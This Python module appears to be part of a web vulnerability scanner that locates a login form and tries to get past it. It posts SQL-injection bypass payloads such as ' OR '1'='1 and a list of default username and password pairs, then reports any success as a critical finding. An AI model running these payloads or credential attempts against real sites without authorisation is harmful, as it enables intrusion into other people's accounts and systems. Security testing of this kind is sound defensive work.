import logging
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

log = logging.getLogger(__name__)

_SQLI_PAYLOADS = [
    ("' OR '1'='1", "anything"),
    ("' OR 1=1--",  "anything"),
    ("admin'--",    "anything"),
    ("' OR '1'='1'--", "anything"),
    ("') OR ('1'='1",  "anything"),
    ("' OR 1=1#",   "anything"),
]

_DEFAULT_CREDS = [
    ("admin",  "admin"),
    ("admin",  "password"),
    ("admin",  "123456"),
    ("admin",  ""),
    ("root",   "root"),
    ("root",   "toor"),
    ("test",   "test"),
    ("guest",  "guest"),
    ("user",   "user"),
    ("jsmith", "demo1234"),
    ("admin",  "admin123"),
]

_FAILURE_INDICATORS = [
    "invalid", "incorrect", "failed", "error", "wrong",
    "unauthorized", "denied", "bad credentials", "login failed",
    "username or password", "try again",
]

_SUCCESS_INDICATORS = [
    "logout", "sign out", "dashboard", "welcome", "account",
    "profile", "my account", "logged in", "home",
]


def _get_login_form(url: str, timeout: int) -> tuple[dict, str] | tuple[None, None]:
    try:
        r = requests.get(url, timeout=timeout, allow_redirects=True)
        soup = BeautifulSoup(r.text, "html.parser")
        form = None
        for f in soup.find_all("form"):
            if f.find("input", {"type": "password"}):
                form = f
                break
        if not form:
            log.debug("No login form found at %s", url)
            return None, None
        action = urljoin(url, form.get("action", url))
        fields = {}
        for inp in form.find_all("input"):
            name = inp.get("name")
            if not name:
                continue
            fields[name] = inp.get("value", "")
        return fields, action
    except requests.exceptions.RequestException as exc:
        log.debug("Failed to fetch login form at %s: %s", url, exc)
        return None, None


def _check_response(response: requests.Response, original_len: int) -> bool:
    body_lower = response.text.lower()
    if any(s in body_lower for s in _SUCCESS_INDICATORS):
        return True
    if "login" not in response.url.lower() and response.url != response.request.url:
        return True
    has_failure = any(f in body_lower for f in _FAILURE_INDICATORS)
    if not has_failure and len(response.text) > original_len * 1.5:
        return True
    return False


def _detect_user_pass_fields(fields: dict) -> tuple[str | None, str | None]:
    user_field = None
    pass_field = None
    for name in fields:
        n = name.lower()
        if any(k in n for k in ("user", "email", "login", "name", "uid")):
            user_field = name
        if any(k in n for k in ("pass", "pwd", "secret")):
            pass_field = name
    return user_field, pass_field


def scan_login_bypass(url: str, timeout: int = 5) -> dict | None:
    fields, action = _get_login_form(url, timeout)
    if not fields or not action:
        return None

    user_field, pass_field = _detect_user_pass_fields(fields)
    if not user_field or not pass_field:
        log.debug("Could not identify username/password fields at %s", url)
        return None

    try:
        baseline = requests.post(
            action,
            data={**fields, user_field: "invalid_user_xyz", pass_field: "invalid_pass_xyz"},
            timeout=timeout,
            allow_redirects=True,
        )
        baseline_len = len(baseline.text)
    except requests.exceptions.RequestException:
        return None

    successful_bypasses = []

    for user_payload, pass_payload in _SQLI_PAYLOADS:
        data = {**fields, user_field: user_payload, pass_field: pass_payload}
        try:
            r = requests.post(action, data=data, timeout=timeout, allow_redirects=True)
            if _check_response(r, baseline_len):
                successful_bypasses.append({
                    "method": "SQLi Bypass",
                    user_field: user_payload,
                    pass_field: pass_payload,
                })
                break
        except requests.exceptions.RequestException as exc:
            log.debug("SQLi bypass attempt failed: %s", exc)

    for username, password in _DEFAULT_CREDS:
        data = {**fields, user_field: username, pass_field: password}
        try:
            r = requests.post(action, data=data, timeout=timeout, allow_redirects=True)
            if _check_response(r, baseline_len):
                successful_bypasses.append({
                    "method": "Default Credentials",
                    user_field: username,
                    pass_field: password,
                })
                break
        except requests.exceptions.RequestException as exc:
            log.debug("Default creds attempt failed: %s", exc)

    if not successful_bypasses:
        return None

    details_lines = []
    for b in successful_bypasses:
        method = b["method"]
        creds = {k: v for k, v in b.items() if k != "method"}
        details_lines.append(f"- [{method}] {creds}")

    return {
        "type": "Login Bypass Vulnerability",
        "url": url,
        "severity": "Critical",
        "cvss": 9.8,
        "details": (
            "Login form is vulnerable to bypass (CWE-287, OWASP A07:2021):\n"
            + "\n".join(details_lines)
            + "\n\nManual verification recommended to confirm access."
        ),
    }